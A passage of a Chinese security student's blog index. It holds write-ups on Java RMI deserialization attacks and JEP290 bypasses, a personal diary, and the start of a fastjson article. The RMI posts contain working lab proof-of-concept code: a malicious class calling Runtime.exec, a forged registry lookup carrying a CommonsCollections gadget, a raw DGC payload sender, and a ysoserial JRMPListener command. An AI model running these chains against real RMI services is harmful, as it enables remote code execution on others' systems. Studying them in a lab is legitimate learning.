在JDK8u231之前，用那个payload打注册中心，会有一个现象，就是当客户端发送完请求之后，服务端会在经过一段时间后就弹一个计算器出来。 这是由于DGCClient#registerRefs，可以看到这是个循环，如果epEntry.registerRefs返回的是false，就会一直卡在这个循环里 其实这里是一个DGC客户端不断向DGC服务端汇报远程对象ref的存活状况，当ref不存在时，该方法的返回值就会是true了，然后就会跳出循环。这样就会造成一个有趣的现象：DGC客户端以一定的时间间隔向DGC服务端(恶意的JRMP服务端)发起请求，类似TCP连接的心跳包，又类似一个不死马，受攻击的DGC客户端(这里是Registry端)会以同频的时间间隔不断弹出计算器。 调用栈 readObject:431, ObjectInputStream (java.io) executeCall:252, StreamRemoteCall (sun.rmi.transport) invoke:161, UnicastRef (sun.rmi.server) invokeRemoteMethod:227, RemoteObjectInvocationHandler (java.rmi.server) invoke:179, RemoteObjectInvocationHandler (java.rmi.server) createServerSocket:-1, $Proxy0 (com.sun.proxy) newServerSocket:666, TCPEndpoint (sun.rmi.transport.tcp) listen:335, TCPTransport (sun.rmi.transport.tcp) exportObject:254, TCPTransport (sun.rmi.transport.tcp) ... exportObject:346, UnicastRemoteObject (java.rmi.server) reexport:268, UnicastRemoteObject (java.rmi.server) readObject:235, UnicastRemoteObject (java.rmi.server) JDK8u241修复在调用UnicastRef.invoke之前声明方法的类，必须要实现Remote接口，然而这里的RMIServerSocketFactory并没有实现，于是无法进入到invoke方法，直接抛出错误。 抬走了，等一手0day 总结虽然写完了，但实际上还有许多细节的部分有点不懂，RMI的东西实在是有点多而且繁琐，这三篇也只能算个基础，还要去学JNDI注入之类的。而且还有一些关于RMI攻击的工具没有用过，比如RMIScout、BaRMIe、ysomap等，还是以后用到了再补吧。比如对于绕过JEP290的方式中，触发反序列化具体的路径是哪里之类的，因为有点懒所以并没有仔细的跟过（补上了，还有就是感谢互联网的共享精神（，感觉这三篇rmi里，有一篇半都是照抄别人的内容。 最后偷张图 补充补一下触发反序列化的地方 绕过JDK8u231的payload反序列化触发点是 从RegistryImpl_Skel里的这个readObject直接跳到UnicastRemoteObject 然后会走我们在前边写的从UnicastRemoteObject到UnicastRef.Invoke的路线，在invoke里的这行会触发一个jrmp请求， 然后就会把从恶意服务端请求回来的结果传进StreamRemoteCall#executeCall，实现攻击的目的 而在在JDK8U231之前绕过JEP290的触发点同样也是从RegistryImpl_Skel开始的 首先是从in.readObject，在这里面会让incomingRefTable的值不为空，然后进入call.releaseInputStream里，去触发我们之前写的UnicastRef的反序列化路线 最终在DGCImpl_Stub#dirty里发起了一个jrmp请求 然后同样是把从恶意服务端返回来的东西调到传进UnicastRef#Invoke，然后再进入StreamRemoteCall#executeCall，实现攻击的目的 参考文章https://paper.seebug.org/1689/ （前两部分基本上都抄的这个 RMI反序列化漏洞之三顾茅庐-JEP290绕过 | Halfblue（UnicastRef的反序列化的部分细节可以看这个 https://su18.org/post/rmi-attack/（反序列化部分都抄的这个 https://xz.aliyun.com/t/7932 https://www.anquanke.com/post/id/211722 https://yagsheg.com/2021/11/29/RMI-%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E5%A4%8D%E7%9B%98%E6%80%BB%E7%BB%93","categories":[],"tags":[{"name":"web学习","slug":"web学习","permalink":"https://ethe448.github.io/tags/web%E5%AD%A6%E4%B9%A0/"},{"name":"Java","slug":"Java","permalink":"https://ethe448.github.io/tags/Java/"}]},{"title":"记事簿","slug":"记事簿","date":"2023-05-19T05:11:38.000Z","updated":"2023-06-17T14:59:41.827Z","comments":true,"path":"2023/05/19/记事簿/","link":"","permalink":"https://ethe448.github.io/2023/05/19/%E8%AE%B0%E4%BA%8B%E7%B0%BF/","excerpt":"","text":"单独开篇文章记一下自己每天都干嘛了，督促一下自己，虽然现在记好像有点晚了hhh 2023/05/19上午去看了一眼运动会开幕式，下午跟继续跟了一下，感觉最少配了四个小时环境。才刚看完攻击服务端的部分 2023/05/20又看了会儿rmi，rmi基本的攻击部分看完了，然后对于高版本的绕过开了个头，感觉明天能结束这个。另外，T1打的真下饭啊，还是想看决赛中韩对抗 2023/05/21大概弄完rmi了，明早再稍微改改就结束了 2023/05/22终于把软著材料送走了，这种雨天真想睡觉啊 2023/05/23jndi差一点 2023/05/24jndi最后面的尾巴算结束了，世上无难事，只要肯放弃，fastjson算是简单的看完了吧，要多刷刷题准备国赛了 2023/05/25准备国赛ing.... 2023/06/12国赛进了分区赛，也收到了工业互联网的决赛通知，被选为预备党员了，准备一下期末考试 今天收到了中科全安的口头offer，虽然这公司风评不好，但我真的很想要实战经历 还有夏令营的事，投材料真麻烦啊，就不能搞个教育部统一的系统吗。不知道能进几个夏令营，要是今年还是线上夏令营该多好啊 我现在前面两条路，保研和就业，我到底该选什么呢，坦白讲我对读研是抗拒的，我不喜欢偏理论的东西，我更想学更多的实践，学术界的东西真搞不明白，万物蹭深度学习发论文，可高校实验室里的深度学习模型又有谁能比得上openai的chatgpt呢。可是如果真能保研，我能和y4✌一样有勇气放弃这个名额吗 2023/06/16接到北京绿盟的offer了，说起来绿盟这面试还真偏实战啊，关于漏洞原理的内容一点没问，问的全是真实环境的东西，不过给的钱也太少了点，好歹网安大厂，咋嫩扣捏。 2023/06/17妈的，接了，谁让是黄埔军校呢","categories":[],"tags":[{"name":"随笔","slug":"随笔","permalink":"https://ethe448.github.io/tags/%E9%9A%8F%E7%AC%94/"}]},{"title":"RMI攻击（二）","slug":"RMI攻击（二）","date":"2023-05-18T06:56:29.000Z","updated":"2023-05-21T12:55:56.171Z","comments":true,"path":"2023/05/18/RMI攻击（二）/","link":"","permalink":"https://ethe448.github.io/2023/05/18/RMI%E6%94%BB%E5%87%BB%EF%BC%88%E4%BA%8C%EF%BC%89/","excerpt":"","text":"前言在第一篇的时候已经分析了RMI整个调用的流程，所以在这里就写一下攻击的流程 根据第一篇的分析 我们已知 攻击服务端1.UnicastServerRef#dispatch -&gt; UnicastServerRef#unmarshalValue-&gt;客户端攻击服务端 2.UnicastServerRef#oldDispatch-&gt;DGCImpl_Skel#dispatch-&gt;客户端攻击服务端 攻击注册中心UnicastServerRef#oldDispatch-&gt;RegistryImpl_Skel#dispatch-&gt;客户端/服务端攻击注册中心 这个路线和攻击服务端的DGCImpl_Skel是一样的，只不过skel不同罢了 攻击客户端1.RegistryImpl_Stub#lookup-&gt;注册中心攻击客户端 假如注册中心返回的是恶意对象，就可能在反序列化的时候被攻击 2.UnicastRef#invoke-&gt;StreamRemoteCall#executeCall-&gt;注册中心/服务端攻击客户端 理论上只要调用invoke方法的地方都可以被攻击，executeCall是真正处理网络请求的地方，如果请求后返回的内容的是TransportConstants.ExceptionalReturn这个错误，就会进行反序列化 3.DGCImpl_Stub#dirty-&gt;服务端攻击客户端 本质和2是一样的，只不过是通过DGCImpl_Stub调用了invoke方法 4.UnicastRef#invoke-&gt;UnicastRef#unmarshalValue-&gt;服务端攻击客户端 攻击实现在前言里我们梳理了几种攻击的路径，接下来就来实际看看攻击方法。 我们先看一下在没有java安全机制的情况下的攻击实现 攻击服务端① 恶意服务参数攻击路线：UnicastServerRef#dispatch -&gt; UnicastServerRef#unmarshalValue 在服务端接收到客户端的参数之后，会对服务端需要接受的参数类型进行判断 假设不是基本类型，就会对传过来的内容进行反序列化，这里就可以成为我们的攻击点 不过这个攻击有个条件，要求服务端必须接收与传入的poc类型一致的参数，最通用的就是Object类型，且客户端必须知道服务端实现的接口内容，否则的话不会到unmarshalValue就会报错 然后就只需要保证传个能反序列化的poc且服务端有对应依赖就行了 我这里传了个cc1的链，代码可以看cc链的那篇文章 但是如果只能攻击接收Object类型的接口，那本来就不大的攻击面就更小了，有没有办法能够攻击接收String类型的参数呢 答案是可以的 一般情况下，server端和client端的接口应该是一致的，而当不一致时，client端会报错 根据报错可以知道，在UnicastServerRef.dispatch里的这一句是负责判断方法是否存在的 这句话会调用hashmap的get方法，然后获取指定 key 对应对 value 因为这个op是我们传进去的内容的key，和server端不同，自然不能查找到method，导致客户端报错。 那就是说如果我们能够控制这个key，那么即使我们传入的是其他东西，他也会找到method，然后继续执行这段程序，然后在unmarshalValue里进行反序列化 这里有四种方法 通过网络代理，在流量层修改数据 自定义 “java.rmi” 包的代码，自行实现 字节码修改 使用 debugger Java Agent不会，自定义 “java.rmi” 包的代码不会，流量层修改数据不会 这里我就只用debugger的方式改了 首先，虽然通过这种方式在服务端不接收Object类型参数的时候也可以把我们的poc传过去，但是，在改的时候必须保证客户端也需要有服务端所对应的方法。比如服务端是接收String类型的sayHallo方法，那么客户端也要有这个方法才能改成功 在客户端的RemoteObjectInvocationHandler类里的invokeRemoteMethod方法处下断点 改之前 改之后 ② 动态类加载动态类加载是RMI的一个特性 如果客户端在调用时，传递了一个可序列化对象，这个对象在服务端不存在，会抛出ClassNotFound 的异常，但RMI支持动态类加载，若设置了java.rmi.server.codebase属性，则会尝试以该地址作为额外的classpath获取.class并加载和反序列化，可以使用以下两者方式指定 System.setProperty(&quot;java.rmi.server.codebase&quot;, &quot;http://127.0.0.1:7777/&quot;); -Djava.rmi.server.codebase=&quot;http://127.0.0.1:9999/&quot; 但是由于一些安全限制，这个攻击方式还有一些其他条件 由于Java SecurityManager的限制，默认是不允许远程加载的，如果需要进行远程加载类，需要安装RMISecurityManager并且配置java.security.policy，这在后面的利用中可以看到。 属性 java.rmi.server.useCodebaseOnly 的值必需为false。但是从JDK 6u45、7u21版本之后开始，java.rmi.server.useCodebaseOnly 的默认值就是true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前虚拟机的java.rmi.server.codebase 指定路径加载类文件。使用这个属性来防止虚拟机从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全性。 再来几点其他的东西 动态类加载机制不区分角色，在三端中都可以触发 需要在触发动态类加载机制的一端设置SecurityManager，否则会报错。前面也提到了 需要在触态类加载机制的一端设置java.rmi.server.useCodebaseOnly=false，该方法用于限制该机制是否允许远程加载。 设置java.rmi.server.codebase为目标类远程地址，不是在触发端设置的，触发端并不知道地址，而是Client端提供的 恶意代码需要放在恶意类的static块或readObject中(回顾原生反序列化) 首先，这玩意儿得先设置Java安全策略 你得先写一个xxx.policy grant &#123; permission java.security.AllPermission; &#125;; 这是最宽松的安全策略，java基本上可以干所有事 然后因为是攻击的是服务端，所以服务端还要使用这个安全策略 还要关闭useCodebaseOnly System.setProperty(&quot;java.rmi.server.useCodebaseOnly&quot;, &quot;false&quot;); System.setProperty(&quot;java.rmi.server.hostname&quot;, &quot;127.0.0.1&quot;);&#x2F;&#x2F;指定RMI服务器的主机名为127.0.0.1 System.setProperty(&quot;java.security.policy&quot;, &quot;D:\\\\ctftools\\\\ctfscript\\\\javastudy\\\\RMIServer\\\\server.policy&quot;); if (System.getSecurityManager() &#x3D;&#x3D; null) &#123; System.out.println(&quot;Setup SecurityManager&quot;); System.setSecurityManager(new SecurityManager());&#x2F;&#x2F;设置安全管理器 这个设置安全管理器一定要在设置安全策略后边，真nm的，查了我一下午 服务端的设置就完成了 完整代码是 public class RMIServer &#123; public static void main(String[] args) throws RemoteException, AlreadyBoundException, MalformedURLException &#123; if (System.getSecurityManager() &#x3D;&#x3D; null) &#123; System.out.println(&quot;Setup SecurityManager&quot;); System.setProperty(&quot;java.rmi.server.useCodebaseOnly&quot;, &quot;false&quot;); System.setProperty(&quot;java.rmi.server.hostname&quot;, &quot;127.0.0.1&quot;); System.setProperty(&quot;java.security.policy&quot;, &quot;D:\\\\ctftools\\\\ctfscript\\\\javastudy\\\\RMIServer\\\\server.policy&quot;); System.setSecurityManager(new SecurityManager()); &#125; System.out.println(&quot;Security Manager: &quot; + System.getSecurityManager()); System.out.println(&quot;Security Policy: &quot; + System.getProperty(&quot;java.security.policy&quot;)); IRemoteObjImpl iRemoteObj &#x3D; new IRemoteObjImpl(); &#x2F;&#x2F; 设置安全策略后再创建注册中心 LocateRegistry.createRegistry(1099); Naming.bind(&quot;rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;iRemoteObj&quot;, iRemoteObj); System.out.println(&quot;Registry运行中......&quot;); &#125; &#125; 然后再准备一个恶意类，因为你要借助的是动态类加载，所以恶意类的恶意代码只能写在静态代码块里，或者是readObject里 public class evil implements Serializable &#123; static &#123; try &#123; System.out.println(&quot;success&quot;); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; private void readObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException, IOException &#123; &#x2F;&#x2F; Read in the threshold (ignored), loadfactor, and any hidden stuff s.defaultReadObject(); System.out.println(&quot;readObject&quot;); Runtime.getRuntime().exec(&quot;calc&quot;); &#125; &#125; 客户端 public class RMIClient implements Serializable &#123; public static void main(String[] args) throws Exception&#123; IRemoteObj remoteObj &#x3D; (IRemoteObj)Naming.lookup(&quot;rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;iRemoteObj&quot;); Object evil &#x3D; new evil(); String s &#x3D; remoteObj.sayHello(evil); &#125; &#125; 我们首先来测试一下 把evil这个文件放到服务端 然后执行 简单跟一下 还是unmarshalValue那地方对客户端传过来的参数做反序列化的时候导致的类加载和反序列化（没跟出来怎么进行了类加载，虽然确实调用了resolveClass进行了类加载，但是没看出来咋跳过去的，就贴个执行的图吧 然后接下来我们把这个evil文件从服务端删掉 这时候再执行客户端会报错 再配置一下客户端 -Djava.rmi.server.useCodebaseOnly&#x3D;false -Djava.rmi.server.codebase&#x3D;http:&#x2F;&#x2F;192.168.1.104:8888&#x2F; 或者用代码 System.setProperty(&quot;java.rmi.server.useCodebaseOnly&quot;, &quot;false&quot;); System.setProperty(&quot;java.rmi.server.codebas&quot;, &quot;http:&#x2F;&#x2F;127.0.0.1:8888&#x2F;&quot;); 然后用python在字节码的路径下面开个8888端口的服务 这里还是报错了，但是看一眼服务器 说明服务端已经请求了这个网址，只不过因为路径问题所以没有访问到。所以换个路径 成了 这个漏洞其实感觉利用面也挺小的，现在的服务应该大部分都是java8了，而这些配置的要求很难实现 ③ 替身攻击看其他师傅的博客里说的一种，但是感觉有点鸡肋了 在讨论对 Server 端的攻击时，还出现了另外一种针对参数的攻击思路，我称其为替身攻击。依旧是用来绕过当参数不是 Object，是指定类型，但是还想触发反序列化的一种讨论。 大体的思路就是调用的方法参数是 HelloObject，而攻击者希望使用 CC 链来反序列化，比如使用了一个入口点为 HashMap 的 POC，那么攻击者在本地的环境中将 HashMap 重写，让 HashMap 继承 HelloObject，然后实现反序列化漏洞攻击的逻辑，用来欺骗 RMI 的校验机制。 这的确是一种思路，但是还不如 hook RMI 代码修改逻辑来得快，所以这里不进行测试。 攻击注册中心再来看攻击注册中心 根据前言的内容，攻击注册中心的路径是这条 UnicastServerRef#oldDispatch-&gt;RegistryImpl_Skel#dispatch-&gt;客户端/服务端攻击注册中心 其实对于注册中心而言，他根本就不需要知道哪个是客户端，哪个是服务端，他只需要知道有人调用了bind和lookup这些方法就行了 调用bind的就是服务端要绑定方法，调用lookup就是客户端要查找方法 但是由于参数的问题lookup、unbind的参数类型都是String，这在运行前编写代码时限制了我们传入恶意Object。不过可以跟攻击服务端的时候的方式一样，去绕过这个 调用bind&amp;rebindbind和rebind这两个实际上就是服务端攻击注册中心，但是利用价值不是很高，因为高版本java的服务端和注册中心本来就在一起，因此不需要去打 还有一个问题就是，如果服务端和客户端在一起，那可以直接通过Registry registry = LocateRegistry.createRegistry(1098)的方式获取注册中心，然后进行绑定，也就不需要借助stub进行代理然后通信了，可以直接和skel通信，那么在skel里，由于反序列化的是网络通信传过来的东西，现在没网络通信了，自然没东西进行反序列化了 所以必须使用Registry registry = LocateRegistry.getRegistry(1098);来获取注册中心 poc public class RMIServer &#123; public static void main(String[] args) throws IOException, AlreadyBoundException, NoSuchFieldException, ClassNotFoundException, InvocationTargetException, NoSuchMethodException, InstantiationException, IllegalAccessException &#123; &#x2F;&#x2F;创建远程对象 IRemoteObjImpl iRemoteObj &#x3D; new IRemoteObjImpl(); &#x2F;&#x2F;创建注册中心 LocateRegistry.createRegistry(1098); &#x2F;&#x2F;获取注册中心 Registry registry &#x3D; LocateRegistry.getRegistry(1098); &#x2F;&#x2F;这就是个单纯的cc1的链 Object o &#x3D; cc1.cc1exp(); &#x2F;&#x2F;下面部分就是创建一个Remote类型的动态代理，因为bind的第二个参数要求传入Remote类型的 Class&lt;?&gt; aClass &#x3D; Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor&lt;?&gt; declaredConstructor &#x3D; aClass.getDeclaredConstructor(Class.class, Map.class); HashMap&lt;String, Object&gt; map &#x3D; new HashMap&lt;&gt;(); map.put(&quot;ethe&quot;,o); declaredConstructor.setAccessible(true); InvocationHandler o1 &#x3D; (InvocationHandler)declaredConstructor.newInstance(Override.class,map); Remote remote &#x3D; (Remote) Proxy.newProxyInstance(Remote.class.getClassLoader(), new Class[]&#123;Remote.class&#125;, o1); registry.bind(&quot;iRemoteObj&quot;,remote); &#x2F;&#x2F; Naming.bind(&quot;rmi:&#x2F;&#x2F;127.0.0.1&#x2F;iRemoteObj&quot;,iRemoteObj); &#125; &#125; 这里我本来想让这个cc1的文件直接继承Remote接口的，但是发现即使继承了，由于他返回的是个HashMap，也不能让HashMap强转成Remote，而要让HashMap也继承Remote接口的话就只能改源码了 调用lookup&amp;unbind这两个只能传入String类型的参数 由于这俩是客户端调用的，所以他们肯定是要到RegistryImpl_Stub里的lookup方法 由于参数var1只能为String类，所以我们需要自己伪造实现lookup方法，并在var3.writeObject(var1);中将我们的恶意类传入。 首先获取ref对象，以下是RegistryImpl_Stub的继承图 ref是RemoteObject的属性，我们可以通过反射调用来获取 Class&lt;?&gt; RO &#x3D; Class.forName(&quot;java.rmi.server.RemoteObject&quot;); Field declaredField &#x3D; RO.getDeclaredField(&quot;ref&quot;); declaredField.setAccessible(true); RemoteRef ref &#x3D; (RemoteRef)declaredField.get(registry); 然后再去获得super.ref.newCall的参数operations 方式一样 Class&lt;?&gt; RegistryImpl_Stub &#x3D; Class.forName(&quot;sun.rmi.registry.RegistryImpl_Stub&quot;); Field operations_field &#x3D; RegistryImpl_Stub.getDeclaredField(&quot;operations&quot;); operations_field.setAccessible(true); Operation[] operations &#x3D; (Operation[])operations_field.get(registry); 然后就是伪造这一部分 完整poc为 public class RMIClient &#123; public static void main(String[] args) throws Exception &#123; &#x2F;&#x2F; System.setProperty(&quot;java.rmi.server.codebase&quot;, &quot;http:&#x2F;&#x2F;127.0.0.1:7777&#x2F;&quot;); &#x2F;&#x2F; evil evil &#x3D; new evil(); Registry registry &#x3D; LocateRegistry.getRegistry(&quot;127.0.0.1&quot;, 1097); &#x2F;&#x2F; IRemoteObj remoteObj &#x3D; (IRemoteObj) registry.lookup(&quot;iRemoteObj&quot;); &#x2F;&#x2F;获取ref Class&lt;?&gt; RO &#x3D; Class.forName(&quot;java.rmi.server.RemoteObject&quot;); Field declaredField &#x3D; RO.getDeclaredField(&quot;ref&quot;); declaredField.setAccessible(true); RemoteRef ref &#x3D; (RemoteRef)declaredField.get(registry); &#x2F;&#x2F;获取 operations Class&lt;?&gt; RegistryImpl_Stub &#x3D; Class.forName(&quot;sun.rmi.registry.RegistryImpl_Stub&quot;); Field operations_field &#x3D; RegistryImpl_Stub.getDeclaredField(&quot;operations&quot;); operations_field.setAccessible(true); Operation[] operations &#x3D; (Operation[])operations_field.get(registry); Object o &#x3D; cc1.cc1exp(); &#x2F;&#x2F;伪造lookup RemoteCall var2 &#x3D; ref.newCall((RemoteObject) registry, operations, 2, 4905912898345647071L); ObjectOutput var3 &#x3D; var2.getOutputStream(); var3.writeObject(o); ref.invoke(var2); &#125; &#125; 攻击完成，这其实就是绕过系统自带的lookup方法，自己写一个lookup，然后就可以随意传参了。 而且只需要重写到super.ref.invoke(var2);就行，毕竟我们只需要在注册中心的服务端调用RegistryImpl_Skel#dispatch然后执行我们的恶意代码。 攻击客户端对于客户端来说，有两个反序列化并可以被利用的地方 从 Registry 端获取调用服务的 stub 并反序列化 调用服务后获取结果并反序列化 恶意Server Stub这个和服务端攻击注册中心的方式差不多（整体上来看 在服务端攻击注册中心的地方我们提到，由于服务端和注册中心在一起，倘若不使用getRegistry，则反序列化不会触发。 但是现在来看，如果不触发，Client端调用lookup进行服务发现时，会拿到Server端在Registry端注册的恶意代理对象并进行反序列化。 所以代码都是差不多的，只是直接用LocateRegistry.createRegistry(1098);获取注册中心就行 客户端就正常客户端 服务端代码为 public class RMIServer &#123; public static void main(String[] args) throws IOException, AlreadyBoundException, NoSuchFieldException, ClassNotFoundException, InvocationTargetException, NoSuchMethodException, InstantiationException, IllegalAccessException &#123; &#x2F;&#x2F;创建远程对象 IRemoteObjImpl iRemoteObj &#x3D; new IRemoteObjImpl(); &#x2F;&#x2F;创建注册中心 Registry registry &#x3D; LocateRegistry.createRegistry(1097); Object o &#x3D; cc1.cc1exp(); Class&lt;?&gt; aClass &#x3D; Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor&lt;?&gt; declaredConstructor &#x3D; aClass.getDeclaredConstructor(Class.class, Map.class); HashMap&lt;String, Object&gt; map &#x3D; new HashMap&lt;&gt;(); map.put(&quot;ethe&quot;,o); declaredConstructor.setAccessible(true); InvocationHandler o1 &#x3D; (InvocationHandler)declaredConstructor.newInstance(Override.class,map); Remote remote &#x3D; (Remote) Proxy.newProxyInstance(Remote.class.getClassLoader(), new Class[]&#123;Remote.class&#125;, o1); registry.bind(&quot;iRemoteObj&quot;,remote); &#125; &#125; 这也就是RegistryImpl_Stub#lookup-&gt;注册中心攻击客户端的路线 恶意Server端返回值根据我们之前的一些分析，我们知道，服务端会反序列化客户端传过来的参数，导致了恶意服务参数攻击。 同样，客户端也会反序列化服务端返回的值，造成恶意Server端返回值攻击 这里客户端和服务端都可以用正常的代码，修改实现类就行 public Object sayHello(String a) throws IOException, NoSuchFieldException, ClassNotFoundException, InvocationTargetException, NoSuchMethodException, InstantiationException, IllegalAccessException &#123; String name &#x3D; this.getClass().getName(); System.out.println(a); Object o &#x3D; cc1.cc1exp(); return o; &#125; 动态类加载和攻击服务端的一样，把角色换过来就好了，感觉没啥说的 攻击DGC在前言里我们还提到了用DGCImpl_Skel#dispatch和DGCImpl_Stub#dirty攻击服务端和客户端的路线 它的通信过程是Server 端启动 DGCImpl，在 Registry 端注册 DGCImpl_Stub ，Client 端获取到 DGCImpl_Stub，通过其与 Server 端通信，Server 端使用 RegistryImpl_Skel 来处理。 DGC客户端打DGC服务端DGC之间的通信也是借助序列化和反序列化的，我们只需要构造一个DGC通信并在指定的位置写入序列化恶意类，经由DGC传输到DGC服务端，从而触发反序列化。 同时，由于 DGC 通信和 RMI 通信在 Transport 层是同样的处理逻辑，只不过根据 Client 端写入的标记ObjID(在初始化LiveRef的时候创建，DGC的ObjID是特定的new ObjID(2);)来区分是是由 RegistryImpl_Skel 还是 DGCImpl_Skel 来处理 (这块没太懂，主要是没找到区分是是由 RegistryImpl_Skel 还是 DGCImpl_Skel 来处理的代码) 然后思路就是通过控制id值，让服务端误认为这个是DGC的东西，然后进入DGCImpl_Skel 里去触发漏洞点 public static void makeDGCCall ( String hostname, int port, Object payloadObject ) throws IOException, UnknownHostException, SocketException &#123; InetSocketAddress isa &#x3D; new InetSocketAddress(hostname, port); Socket s &#x3D; null; DataOutputStream dos &#x3D; null; try &#123; &#x2F;&#x2F; 在TCP(Transport)层获取连接 s &#x3D; SocketFactory.getDefault().createSocket(hostname, port); s.setKeepAlive(true); s.setTcpNoDelay(true); &#x2F;&#x2F; 取出数据流OutputStream，这里对着类似的writeObject方法来看 OutputStream os &#x3D; s.getOutputStream(); dos &#x3D; new DataOutputStream(os); &#x2F;&#x2F; 写一些TCP传输的必要标志 dos.writeInt(TransportConstants.Magic); dos.writeShort(TransportConstants.Version); dos.writeByte(TransportConstants.SingleOpProtocol); dos.write(TransportConstants.Call); @SuppressWarnings ( &quot;resource&quot; ) &#x2F;&#x2F; 下面才是真正的对应到代码层面，从TCPTransport#handleMessages方法开始 final ObjectOutputStream objOut &#x3D; new MarshalOutputStream(dos); &#x2F;&#x2F; 写ObjID，2代表DGC，后面接着3个代表随机数，随便写 &#x2F;&#x2F; 对应sun.rmi.transport.Transport#serviceCall方法中的 &#x2F;&#x2F; var39 &#x3D; ObjID.read(var1.getInputStream()); objOut.writeLong(2); &#x2F;&#x2F; DGC objOut.writeInt(0); objOut.writeLong(0); objOut.writeShort(0); &#x2F;&#x2F; 选择DGCImpl的操作，dirty或clean都可以 &#x2F;&#x2F; 对应sun.rmi.server.UnicastServerRef#dispatch方法中的 &#x2F;&#x2F; int var3 &#x3D; var39.readInt(); objOut.writeInt(1); &#x2F;&#x2F; dirty &#x2F;&#x2F; 写DGC接口的hash，值就是-669196253586618813L &#x2F;&#x2F; 对应sun.rmi.server.UnicastServerRef#oldDispatch中的 &#x2F;&#x2F; var4 &#x3D; var18.readLong(); &#x2F;&#x2F; 以及sun.rmi.transport.DGCImpl_Skel#dispatch中的判断 objOut.writeLong(-669196253586618813L); objOut.writeObject(payloadObject); os.flush(); &#125; finally &#123; if ( dos !&#x3D; null ) &#123; dos.close(); &#125; if ( s !&#x3D; null ) &#123; s.close(); &#125; &#125; &#125; 原理懂了，代码写不出来 抄一下其他人的做的图 这个攻击手段实际上就是 ysoserial 中的 ysoserial.exploit.JRMPClient 的实现原理 DGC其实客户端、注册中心、服务端都能打，但是因为只有注册中心的端口是确认的，所以一般都是打注册中心 调用链 ysoserial里用的是使用socket重写了JRMP协议，这里还有另一种方式，就是获取DGCImpl_Stub对象，重写dirty方法，在DGCImpl_Skel#dispatch中触发反序列化，跟打注册中心的差不多 就跟客户端攻击注册中心的时候重写lookup差不多 DGC服务端打客户端同样的道理可以用DGC服务端打客户端，在DGCImpl_Stub触发反序列化。但是既然最后调用的都是call.executeCall();，那为啥不用UnicastRef#invoke-&gt;StreamRemoteCall#executeCall-&gt;注册中心/服务端攻击客户端这条路呢。这篇没提这条链，是因为他还有更重要的使命（ 攻击JRMP客户端前面分析过，只要客户端的stub发起JRMP请求，就会调用UnicastRef#invoke，也就会调用StreamRemoteCall#executeCall，假设在异常处理的时候满足了那个判断，就会导致被反序列化攻击。这里想实现攻击需要自己实现一个恶意服务端，把返回的异常信息改成payload，其实这就是ysoserial里面的exploit/JRMPListener实现的功能。具体实现大概就是从TCPTransport#run0拷过来，没用的删删，改改最后处理的地方。具体使用是先启动监听 java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 calc.exe 然后启用客户端去向这个恶意服务端端发起请求 参考链接https://www.freebuf.com/vuls/346762.html https://xz.aliyun.com/t/7930 https://yagsheg.com/2021/11/29/RMI-%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E5%A4%8D%E7%9B%98%E6%80%BB%E7%BB%93/ https://goodapple.top/archives/520 https://su18.org/post/rmi-attack/ RMI反序列化漏洞之三顾茅庐-攻击实现 | Halfblue Java 安全-RMI学习总结 (townmacro.cn) Java 中 RMI、JNDI、LDAP、JRMP、JMX、JMS那些事儿（上） (seebug.org)","categories":[],"tags":[{"name":"web学习","slug":"web学习","permalink":"https://ethe448.github.io/tags/web%E5%AD%A6%E4%B9%A0/"},{"name":"Java","slug":"Java","permalink":"https://ethe448.github.io/tags/Java/"}]},{"title":"","slug":"fastjson反序列化","date":"2023-05-07T09:44:45.539Z","updated":"2023-05-24T15:42:31.549Z","comments":true,"path":"2023/05/07/fastjson反序列化/","link":"","permalink":"https://ethe448.github.io/2023/05/07/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","excerpt":"","text":"title: fastjson反序列化tags: web学习 Javaabbrlink: 13031date: 2023-05-07 17:44:45 环境配置&lt;dependency> &lt;groupId>com.alibaba&lt;/groupId> &lt;artifactId>fastjson&lt;/artifactId> &lt;version>1.2.23&lt;/version> &lt;/dependency> Fastjson概述FastJson是一个由阿里巴巴研发的java库，可以把java对象转换为JSON格式，也可以把JSON字符串转换为对象 这里列举一些 fastjson 功能要点： 使用 JSON.parse(jsonString) 和 JSON.parseObject(jsonString, Target.class)，两者调用链一致，前者会在 jsonString 中解析字符串获取 @type 指定的类，后者则会直接使用参数中的class。 fastjson 在创建一个类实例时会通过反射调用类中符合条件的 getter/setter 方法，其中 getter 方法需满足条件：方法名长于 4、不是静态方法、以 get 开头且第4位是大写字母、方法不能有参数传入、继承自 Collection|Map|AtomicBoolean|AtomicInteger|AtomicLong、此属性没有 setter 方法；setter 方法需满足条件：方法名长于 4，以 set 开头且第4位是大写字母、非静态方法、返回类型为 void 或当前类、参数个数为 1 个。具体逻辑在 com.alibaba.fastjson.util.JavaBeanInfo.build() 中。 使用 JSON.parseObject(jsonString) 将会返回 JSONObject 对象，且类中的所有 getter 与setter 都被调用。 如果目标类中私有变量没有 setter 方法，但是在反序列化时仍想给这个变量赋值，则需要使用 Feature.SupportNonPublicField 参数。 fastjson 在为类属性寻找 get/set 方法时，调用函数 com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#smartMatch() 方法，会忽略 _|- 字符串，也就是说哪怕你的字段名叫 _a_g_e_，getter 方法为 getAge()，fastjson 也可以找得到，在 1.2.36 版本及后续版本还可以支持同时使用 _ 和 - 进行组合混淆。 fastjson 在反序列化时，如果 Field 类型为 byte[]，将会调用com.alibaba.fastjson.parser.JSONScanner#bytesValue 进行 base64 解码，对应的，在序列化时也会进行 base64 编码。 使用先建一个javabean public class javaBean &#123; private String name; private int id; public javaBean()&#123; System.out.println(&quot;无参构造&quot;); &#125; public javaBean(String name, int id) &#123; this.name &#x3D; name; this.id &#x3D; id; &#125; @Override public String toString() &#123; return &quot;User&#123;&quot; + &quot;name&#x3D;&#39;&quot; + name + &#39;\\&#39;&#39; + &quot;, id&#x3D;&quot; + 